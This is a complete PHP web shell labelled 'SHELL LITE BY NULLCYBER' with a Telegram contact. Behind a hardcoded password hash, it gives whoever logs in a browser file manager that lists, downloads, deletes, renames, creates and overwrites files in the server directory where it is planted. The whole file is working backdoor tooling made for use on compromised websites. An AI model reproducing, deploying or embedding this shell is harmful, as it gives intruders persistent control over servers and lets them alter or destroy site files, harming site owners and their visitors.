<?php
session_start();

// Hardcoded password hash for login (bcrypt hashed password for 'password123')
$hashed_password = '$2y$10$E31H1sf0UTenehapItWK8./oQj94LggM/98fwq7jZBpqU8y553jjO';
$login_url = $_SERVER['PHP_SELF'];

// Check login
if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        $entered_password = $_POST['password'];
        $status = "";
        if (password_verify($entered_password, $hashed_password)) {
            $_SESSION['logged_in'] = true;
            $status = "benar";
        } else {
            $status = "salah";
        }

        if ($status === "benar") {
            header('Location: ' . $login_url);
            exit;
        } else {
            $login_error = "Password salah.";
        }
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    </head>
    <body>
        <div class="container py-5">
            <h1 class="mb-4">SHELL LITE BY NULLCYBER</h1>
            <?php if (isset($login_error)): ?>
                <div class="alert alert-danger">
                    <?= htmlspecialchars($login_error); ?>
                </div>
            <?php endif; ?>
            <form method="POST">
                <div class="mb-3">
                    <label for="password" class="form-label">Password</label>
                    <input type="password" class="form-control" id="password" name="password" required>
                </div>
                <button type="submit" class="btn btn-primary">Login</button>
            </form>
        </div>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    </body>
    </html>
    <?php
    exit;
}

$current_dir = __DIR__;
$items = scandir($current_dir);
$items = array_diff($items, ['.', '..']);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['delete'])) {
        $item_to_delete = basename($_POST['delete']);
        $item_path = "$current_dir/$item_to_delete";
        if (is_file($item_path)) {
            if (unlink($item_path)) {
                $_SESSION['message'] = "$item_to_delete berhasil dihapus.";
            } else {
                $_SESSION['message'] = "Gagal menghapus file $item_to_delete.";
            }
        } elseif (is_dir($item_path)) {
            if (rmdir($item_path)) {
                $_SESSION['message'] = "$item_to_delete berhasil dihapus.";
            } else {
                $_SESSION['message'] = "Gagal menghapus folder $item_to_delete.";
            }
        }
    } elseif (isset($_POST['edit']) && isset($_POST['new_name'])) {
        $item_to_edit = basename($_POST['edit']);
        $new_name = basename($_POST['new_name']);
        $old_path = "$current_dir/$item_to_edit";
        $new_path = "$current_dir/$new_name";
        if (rename($old_path, $new_path)) {
            $_SESSION['message'] = "$item_to_edit berhasil diubah menjadi $new_name.";
        } else {
            $_SESSION['message'] = "Gagal mengubah $item_to_edit.";
        }
    } elseif (isset($_POST['edit_content']) && isset($_POST['new_content'])) {
        $file_to_edit = basename($_POST['edit_content']);
        $file_path = "$current_dir/$file_to_edit";
        if (is_file($file_path)) {
            file_put_contents($file_path, $_POST['new_content']);
            $_SESSION['message'] = "Isi file $file_to_edit berhasil diperbarui.";
        } else {
            $_SESSION['message'] = "Gagal memperbarui isi file $file_to_edit.";
        }
    } elseif (isset($_POST['create_folder']) && isset($_POST['folder_name'])) {
        $folder_name = basename($_POST['folder_name']);
        $folder_path = "$current_dir/$folder_name";
        if (mkdir($folder_path)) {
            $_SESSION['message'] = "Folder $folder_name berhasil dibuat.";
        } else {
            $_SESSION['message'] = "Gagal membuat folder $folder_name.";
        }
    } elseif (isset($_POST['create_file']) && isset($_POST['file_name'])) {
        $file_name = basename($_POST['file_name']);
        $file_path = "$current_dir/$file_name";
        if (file_put_contents($file_path, '') !== false) {
            $_SESSION['message'] = "File $file_name berhasil dibuat.";
        } else {
            $_SESSION['message'] = "Gagal membuat file $file_name.";
        }
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NULLCYBER</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <div class="container py-5">
        <h1 class="mb-4">TELEGRAM:Nullcyber_X</h1>
        <?php if (isset($_SESSION['message'])): ?>
            <div class="alert alert-success">
                <?= htmlspecialchars($_SESSION['message']); unset($_SESSION['message']); ?>
            </div>
        <?php endif; ?>

        <form method="POST" class="mb-4">
            <div class="row">
                <div class="col-md-6">
                    <div class="input-group">
                        <input type="text" name="folder_name" class="form-control" placeholder="Folder Name">
                        <button type="submit" name="create_folder" class="btn btn-primary">Create Folder</button>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="input-group">
                        <input type="text" name="file_name" class="form-control" placeholder="File Name">
                        <button type="submit" name="create_file" class="btn btn-primary">Create File</button>
                    </div>
                </div>
            </div>
        </form>

        <table class="table table-bordered">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Type</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php if (empty($items)): ?>
                    <tr>
                        <td colspan="3" class="text-center">No files or folders found.</td>
                    </tr>
                <?php else: ?>
                    <?php foreach ($items as $item): ?>
                        <tr>
                            <td><?= htmlspecialchars($item); ?></td>
                            <td><?= is_dir("$current_dir/$item") ? 'Folder' : 'File'; ?></td>
                            <td>
                                <?php if (is_file("$current_dir/$item")): ?>
                                    <a href="<?= urlencode($item); ?>" class="btn btn-success btn-sm" download>Download</a>
                                    <button class="btn btn-info btn-sm" data-bs-toggle="modal" data-bs-target="#editContentModal-<?= htmlspecialchars($item); ?>">Edit Content</button>
                                <?php endif; ?>
                                <form method="POST" action="" style="display: inline;">
                                    <input type="hidden" name="delete" value="<?= htmlspecialchars($item); ?>">
                                    <button type="submit" class="btn btn-danger btn-sm">Delete</button>
                                </form>
                                <button class="btn btn-warning btn-sm" data-bs-toggle="modal" data-bs-target="#editModal-<?= htmlspecialchars($item); ?>">Rename</button>

                                <!-- Rename Modal -->
                                <div class="modal fade" id="editModal-<?= htmlspecialchars($item); ?>" tabindex="-1" aria-labelledby="editModalLabel" aria-hidden="true">
                                    <div class="modal-dialog">
                                        <div class="modal-content">
                                            <div class="modal-header">
                                                <h5 class="modal-title" id="editModalLabel">Rename <?= htmlspecialchars($item); ?></h5>
                                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                                            </div>
                                            <form method="POST" action="">
                                                <div class="modal-body">
                                                    <input type="hidden" name="edit" value="<?= htmlspecialchars($item); ?>">
                                                    <div class="mb-3">
                                                        <label for="new_name" class="form-label">New Name</label>
                                                        <input type="text" class="form-control" name="new_name" id="new_name" required>
                                                    </div>
                                                </div>
                                                <div class="modal-footer">
                                                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                                                    <button type="submit" class="btn btn-primary">Save Changes</button>
                                                </div>
                                            </form>
                                        </div>
                                    </div>
                                </div>

                                <!-- Edit Content Modal -->
                                <div class="modal fade" id="editContentModal-<?= htmlspecialchars($item); ?>" tabindex="-1" aria-labelledby="editContentModalLabel" aria-hidden="true">
                                    <div class="modal-dialog">
                                        <div class="modal-content">
                                            <div class="modal-header">
                                                <h5 class="modal-title" id="editContentModalLabel">Edit Content of <?= htmlspecialchars($item); ?></h5>
                                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                                            </div>
                                            <form method="POST" action="">
                                                <div class="modal-body">
                                                    <input type="hidden" name="edit_content" value="<?= htmlspecialchars($item); ?>">
                                                    <div class="mb-3">
                                                        <label for="new_content" class="form-label">Content</label>
                                                        <textarea class="form-control" name="new_content" id="new_content" rows="10" required><?= htmlspecialchars(is_file("$current_dir/$item") ? file_get_contents("$current_dir/$item") : ''); ?></textarea>
                                                    </div>
                                                </div>
                                                <div class="modal-footer">
                                                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                                                    <button type="submit" class="btn btn-primary">Save Changes</button>
                                                </div>
                                            </form>
                                        </div>
                                    </div>
                                </div>

                            </td>
                        </tr>
                    <?php endforeach; ?>
                <?php endif; ?>
            </tbody>
        </table>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>

